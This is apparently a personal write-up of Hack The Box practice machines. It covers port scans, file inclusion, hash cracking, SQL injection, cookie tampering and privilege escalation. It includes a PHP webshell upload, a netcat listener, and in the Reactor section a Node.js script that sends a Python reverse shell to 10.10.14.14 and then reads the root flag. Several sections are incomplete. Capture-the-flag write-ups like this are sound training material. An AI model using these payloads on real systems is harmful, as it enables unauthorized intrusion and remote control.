---
title: HTB Labs
date: 2026-06-24
tag: writeup
category: htb
---

must connect to the VPN for labs and then proceed

# Sequel
We start by scanning the ports of the target machine

Port `3306` is open which is a MySQL service

then open in `mysql`

from there SELECT the config table and find the flag there

# Crocodile
Nmap shows us ports for FTP Server Open and http open (Apache Server)
Connected to an FTP server and got the users and passwords
then logged into account (elevated account privileges) through accessing the endpoint
received the flag

# Responder
10.129.2.105 is the target IP

- Performed an Nmap Scan which showed that only Port 80 (HTTP) is open open on the system

Curling the showed that the IP redirects to `unika.htb`

First we had to add unika.htb to subdomain list  
`sudo sh -c 'echo "10.129.3.25 unika.htb" >> /etc/hosts'`

After visiting the site we notice that clicking on the language options shows us a URL Like this


From which we can assume that a LFI (Local File Inclusion) is Exploitable and we could traverse the Directory straight from the URL

We also have the RFI (Remote File Inclusion) Vulnerability which causes a server to serve files from a remote machine such as attackers machine

`http://unika.htb/index.php?page=//172.17.24.248/ids.txt`

in this case using responder to listen on events that take place between server and User we find that since the server uses Windows, it initiates UNC which sends a hash that needs to be authenticated to allow files to be served.

We take that Hash and we use John the ripper To crack the hash.

After cracking the hash we remotely access port 5985 to access the WIndow's thing.

Looked around the machine for a bit and eventually found the flag in 
`C:/Users/mike/Desktop/flag.txt`

![[Capture.PNG]]

# Three

Methodology:
1- Recon
2- Enumeration
3- Vulnerability Analysis
4- Exploitation
5- Post Exploitation (privilege escalation)
6- Reporting

Start with connecting to the Arena VPN (I am using release_arena_eu-release-2)
``` sh
  sudo openvpn <vpn>
```

This is when we follow the Pentesting methodology

then performing network enumeration to see which ports are open on the machine
``` sh
  nmap <ip>
```

started the scan with a rate limited scan since it was taking too long

``` bash
nmap -p- --min-rate 5000 -Pn -oN quick_scan 10.129.51.214
```
output:
``` bash
# Nmap 7.95 scan initiated Thu Jun 18 01:03:27 2026 as: nmap -p- --min-rate 5000 -Pn -oN quick_scan 10.129.51.214
Nmap scan report for 10.129.51.214
Host is up.
All 65535 scanned ports on 10.129.51.214 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)

# Nmap done at Thu Jun 18 01:03:56 2026 -- 1 IP address (1 host up) scanned in 28.73 seconds
```

decrease the rate from 5000 to 1000 as since if we were sending out 5000 packets a second high likely hood the host just dropped them thus giving me no response, (either this was the issue or the VPN connection dropped for a moment)

``` bash
# Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-18 01:22 PKT as: nmap -p- --min-rate 1000 -Pn -oN quick_scan 10.129.51.214
Nmap scan report for 10.129.51.214
Host is up (0.24s latency).
Not shown: 61700 closed tcp ports (reset), 3833 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Thu Jun 18 01:32:57 2026 -- 1 IP address (1 host up) scanned in 620.15 seconds
```

Took a closer look at the http Service

``` bash
# Nmap 7.95 scan initiated Thu Jun 18 01:36:21 2026 as: nmap -p80 -sV -sC -oN http_scan.txt 10.129.51.214
Nmap scan report for 10.129.51.214
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 18 01:36:38 2026 -- 1 IP address (1 host up) scanned in 16.28 seconds
```

have to install Golang on my WSL (for Gobuster and other useful tools) as well so now I have 2 instances... sigh. I use Gobuster since its good for subdomain finding

Starting Point tier HTB machines use virtual host routing so I need to ensure that my system can resolve the machine name.
``` bash
echo "10.129.51.214  thetoppers.htb" >> /etc/hosts
```
![[domainNameMapping.png]]

Since I have not installed Burpsuite I want a very light weight browser. Something that won't eat my storage. Apparently dillo exists, lets try it out. (netsurf is a more mature version of this exact thing, these are very popularly used with *RISC OS*)

Forgive me for getting distracted but how couldn't I, after seeing this thing.

This thing pairs so well with lite.duckduckgo.com
![[dilloWithDuckDuckLite.png]]

Anyway the task at hand, the websites front page doesn't seem to have anything special.
![[dilloAccessToppers.png]]

Time for subdomain enumeration I suppose! 
First we need to install a wordlist then we perform enumeration:
```bash 
sudo apt install wordlists seclists -y

#gobuster vhost -u http://thetoppers.htb -w 
```

The wordlist is bigger than I expected, nothing we need to heed mind to though.
Will continue when I wake up.

Had to restart the machine so that meant I had to change the IP in the machine. (`vim /etc/hosts` and then changed the IP)

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

we find a subdomain for the s3 bucket. Add that subdomain to `/etc/hosts` and then access the s3 bucket with the `awscli`

upon curling we get
```bash
curl s3.thetoppers.htb
{"status": "running"}
```

![[accessingS3.png]]

we us `cp` to copy a shell injection for RCE into the s3 bucket. 

```bash
echo "<?php system($_GET["cmd"]) ?>" > shell.php
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

# upload: ./shell.php to s3://thetoppers.htb/shell.php
```

then we access it from our browser and test to see if we can execute commands
![[RCE.png]]

I want to see if I can get a reverse shell. 

*one way that we can do this: (better to just make a bash shell)*

Set a Netcat Listener in this case on port 4444, and use the `shell.php` to execute a command so that a shell connects to the Netcat listener
![[netcat.png]]
# Vaccine

Ran an Nmap Scan, found an FTP server

Connect to the FTP server using anonymous account

Get Zip file, requires password to access

Used Zip2John to get the hash

Then JohntheRipper to crack the hash

Read the `.php` file


SQLMap  
```bash
sqlmap -u 'http://10.129.54.205/dashboard.php?search=any+query' --cookie="PHPSESSID=v9fgpbj6ildjcrrt1nktkha62l"
```

# Oopsie

Network Enumeration
```bash
# Nmap 7.95 scan initiated Fri Jun 19 19:32:36 2026 as: nmap -sC -sV -Pn -oN scan.txt 10.129.95.191
Nmap scan report for 10.129.95.191
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
# Nmap done at Fri Jun 19 19:33:36 2026 -- 1 IP address (1 host up) scanned in 60.26 seconds
```

Tried ffuf to see if there are subdomains I don't know about 
```bash
 :: Method           : GET
 :: URL              : http://10.129.95.191/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1028ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4036ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5040ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 214ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 214ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 212ms]
index.php               [Status: 200, Size: 10932, Words: 1345, Lines: 479, Duration: 213ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 213ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 220ms]
themes                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 225ms]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 211ms]
:: Progress: [4751/4751] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
```
nothing...

hints seem to suggest intercepting internet traffic, we will do so by using **Burpsuite**. By intercepting the traffic I found a GET request to a login script. Accessing the path to that login redirects to a login panel

Using that login panel I then go to accounts page and see the ids can be modified (IDOR). From there I see the User ID. I can then change the cookies to have `role:admin` and `id:*****` 

I uploaded `revshell.php` and then started a Netcat listener `nc -lvnp 443`
It wasn't working since I didn't use the pentestmonkey script but had only copied half of it (careless mistake). After getting access in the machine we were able to find the user flag. Went to where the website is located found user `roberts` credentials. Sudo into `robert`. Find that cat is exploitable in bugtracker executable due to it setting the SUID. Hijacked the cat command and got root access.   

# Archetype
This one is a `Windows` Machine

Network Discovery shows us an `smb` service and a `sql` DB

``` bash
# Nmap 7.95 scan initiated Sat Jun 20 18:16:35 2026 as: nmap -sC -sV -Pn -oN scan.txt 10.129.95.187
Nmap scan report for 10.129.95.187
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2026-06-20T13:17:10+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-20T13:15:35
|_Not valid after:  2056-06-20T13:15:35
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-20T06:17:02-07:00
| smb2-time:
|   date: 2026-06-20T13:16:58
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: 1h45m04s, deviation: 3h30m03s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 20 18:17:07 2026 -- 1 IP address (1 host up) scanned in 31.91 seconds
```

Run `smbclient` in hopes of finding shares
```bash
#smbclient -L //10.129.95.187/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

from this we know of some shares such as backups. 
![[smbShareBackup.png]]

after getting the `prod.dtsConfig` file I found `sql` credentials in there
![[SQLPass.png]]

to access the `sql` server I use impacket-mssqlclient, I install the package and then. Impacket is not working there is a misconfiguration with the TLS (since the server uses a legacy configuration). 

Instead I used Metasploit to craft the shell
# Unified
network scan 
``` bash
#nmap -p- --min-rate 5000 -v 10.129.96.149
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 22:14 PKT
Initiating Ping Scan at 22:14
Scanning 10.129.96.149 [4 ports]
Completed Ping Scan at 22:14, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:14
Completed Parallel DNS resolution of 1 host. at 22:14, 1.01s elapsed
Initiating SYN Stealth Scan at 22:14
Scanning 10.129.96.149 [65535 ports]
Discovered open port 22/tcp on 10.129.96.149
Discovered open port 8080/tcp on 10.129.96.149
Discovered open port 8443/tcp on 10.129.96.149
Increasing send delay for 10.129.96.149 from 0 to 5 due to 1760 out of 5866 dropped probes since last increase.
Increasing send delay for 10.129.96.149 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.96.149 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.129.96.149 from 20 to 40 due to max_successful_tryno increase to 6
Discovered open port 8880/tcp on 10.129.96.149
Discovered open port 6789/tcp on 10.129.96.149
Discovered open port 8843/tcp on 10.129.96.149
Completed SYN Stealth Scan at 22:14, 16.26s elapsed (65535 total ports)
Nmap scan report for 10.129.96.149
Host is up (0.21s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
8843/tcp open  unknown
8880/tcp open  cddbp-alt

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds
           Raw packets sent: 78698 (3.463MB) | Rcvd: 75494 (3.020MB)
```

Accessing the website we see it uses UniFi version 6.5.54 which susceptible to the `Log4J` Exploit. 

Which takes advantage of `LDAP` Service 
# Facts
# Cap
Start with Network Enumeration. This is the fastest I have had an Nmap scan work
```bash
nmap -p- --open -sS -min-rate 5000 -n -vvv -Pn

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

I installed a bunch of browsers that are either bad, or just don't work 
surf, epiphany-browser. I'm getting rid of both of them and downloading the old reliable `Firefox`. 

since I was running on root, had to do this `sudo -u slick firefox`

upon opening the website I see that a security Snapshot link on the sidebar, tapping it changes my link

## Notes

# CCTV (Season 10 Lab)
# Reactor
Network Enumeration gives us this result

```bash
# Nmap 7.95 scan initiated Wed Jun 24 15:59:02 2026 as: nmap -sV -sC -oN scan.txt 10.129.109.217
Nmap scan report for 10.129.109.217 (10.129.109.217)
Host is up (0.37s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT     STATE    SERVICE          VERSION
22/tcp   open     ssh              OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
545/tcp  filtered ekshell
1068/tcp filtered instl_bootc
1900/tcp filtered upnp
3000/tcp open     ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Wed, 24 Jun 2026 11:06:08 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Wed, 24 Jun 2026 11:06:20 GMT
|     Connection: close
|   NCP:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
3003/tcp filtered cgms
3269/tcp filtered globalcatLDAPssl
3370/tcp filtered satvid-datalnk
5431/tcp filtered park-agent
5911/tcp filtered cpdlc
5952/tcp filtered unknown
6969/tcp filtered acmsoda
7002/tcp filtered afs3-prserver
8400/tcp filtered cvd
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=6/24%Time=6A3BB8EA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Wed,\x2024\x20Jun\x202026\x2011:06:08\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(NCP,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,10C,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Router-State
SF:-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch\r\nAllo
SF:w:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no-cache,\
SF:x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Wed,\x2024\x2
SF:0Jun\x202026\x2011:06:20\x20GMT\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 24 16:01:46 2026 -- 1 IP address (1 host up) scanned in 163.88 seconds
```

from this we can tell that a NextJS application is being hosted. 

![[versionNextJS.png]]
from this we can see that version 15.0.3 is being used in this instance and a quick Google Search shows us that this version is vulnerable to the **React2Shell** exploit (*CVE-2025-55182*)

`source venv/bin/activate`

Running React2Shell Ultimate Script I set up a shell in "god mode"
![[exploit.png|697]]

After gaining access and checking the db configs I found password hashes for the engineer and admin users. Was able to crack the engineer hash

SSHing into engineer was able to allow me to find the user flag. I then installed Linpeas to see what vulnerabilities my machine might be susceptible to. 

Linpeas shows that there is a vulnerability in node (its running root and we can use it to craft a shell)
![[node.png]]

```javascript
const { WebSocket } = require('ws');
const { exec } = require('child_process');

// Craft a root payload targeting your local VPN IP (10.10.14.14)
const payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;

// Connect to the local Node Inspector WebSocket protocol
async function run() {
    try {
        // Query the local JSON endpoint to discover the active WebSocket UUID
        const res = await fetch('http://1');
        const data = await res.json();
        const wsUrl = data[0].webSocketDebuggerUrl;

        console.log(`[+] Connecting to Debugger: ${wsUrl}`);
        const ws = new WebSocket(wsUrl);

        ws.on('open', () => {
            console.log('[+] Sending payload to evaluate execution context...');
            ws.send(JSON.stringify({
                id: 1,
                method: 'Runtime.evaluate',
                params: { expression: `require('child_process').exec('${payload}')` }
            }));
        });
    } catch (err) {
        console.log('[-] Attempting raw attachment strategy...');
    }
}
```

```bash
engineer@reactor:/tmp$ node inspect 127.0.0.1:9229
> process.mainModule.require('fs').readFileSync('/root/root.txt', 'utf8')
'4d8ecae288a87b27820a3ffa0e9491f3\n'
```